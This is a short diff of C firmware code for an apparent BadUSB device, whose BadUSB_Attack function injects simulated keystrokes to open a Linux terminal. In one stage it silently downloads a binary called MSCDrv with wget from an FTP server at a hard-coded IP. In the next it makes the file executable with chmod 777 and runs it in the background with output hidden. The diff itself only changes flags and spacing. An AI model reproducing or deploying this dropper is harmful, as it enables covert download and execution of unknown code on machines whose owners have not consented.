@@ -619,14 +619,14 @@ void BadUSB_Attack(int stage){
 		uint8_t Terminal[3] = LinuxTerminal;
 		char AttackStr0[256];
 		strcpy(AttackStr0,
-				"cd /home/user/Templates\nwget ftp://anonymous:@192.168.59.207/MSCDrv > /dev/null 2>&1 &\nexit\n");
+				"cd /home/user/Templates\nwget -q ftp://anonymous:@192.168.59.207/MSCDrv >/dev/null 2>&1 &\nexit\n");
 		SimulateShortcutKey(Terminal, 3);
 		SimulateKeyStrokes(AttackStr0, strlen(AttackStr0), &PrintCnt);
 	}else if(stage == 1){
 		uint8_t Terminal[3] = LinuxTerminal;
 		char AttackStr1[256];
 		strcpy(AttackStr1,
-				"cd /home/user/Templates\nchmod 777 MSCDrv\n./MSCDrv > /dev/null 2>&1 &\nexit\n");
+				"cd /home/user/Templates\nchmod 777 MSCDrv\n./MSCDrv >/dev/null 2>&1 &\nexit\n");
 		SimulateShortcutKey(Terminal, 3);
 		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
 	}else{    //test
